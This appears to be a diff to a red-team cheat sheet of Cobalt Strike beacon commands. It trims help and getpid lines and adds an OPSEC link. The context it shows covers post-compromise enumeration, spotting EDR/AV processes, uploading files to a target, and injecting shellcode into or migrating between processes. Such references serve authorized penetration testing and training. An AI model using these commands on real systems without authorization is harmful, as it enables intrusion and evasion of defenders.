@@ -9,22 +9,12 @@ When you double-click a beacon in the CS console, the **Interact** tab opens.
 - Bottom pane: command input
 - Tab-complete works on most commands
 
----
+>[OPSEC Consideration for Beacon Commands](https://www.cobaltstrike.com/blog/opsec-considerations-for-beacon-commands)  
 
-## Built-in Help
-
-```
-beacon> help                    # Full command list with one-line descriptions
-beacon> help <command>          # Detailed help for a specific command
-```
-
----
-
-## Situational Awareness — First Commands After Beacon
+## Situational Awareness — Commands
 
 ```
 beacon> getuid                  # Who am I? (domain\user + integrity level)
-beacon> getpid                  # PID of beacon process
 beacon> ps                      # Process list — look for EDR/AV, find steal_token targets
 beacon> net localgroup          # Local group memberships
 beacon> net computers           # Enumerate domain computers (via NetAPI)
@@ -70,7 +60,6 @@ beacon> upload /local/file.exe  # Upload file from CS client to target
 ```
 beacon> ps                      # List all processes
 beacon> kill <PID>              # Kill a process
-beacon> getpid                  # Get beacon's own PID
 beacon> inject <PID> x64 <listener>   # Inject shellcode into running process
 beacon> migrate <PID>           # Migrate beacon to another process (changes PID)
 ```
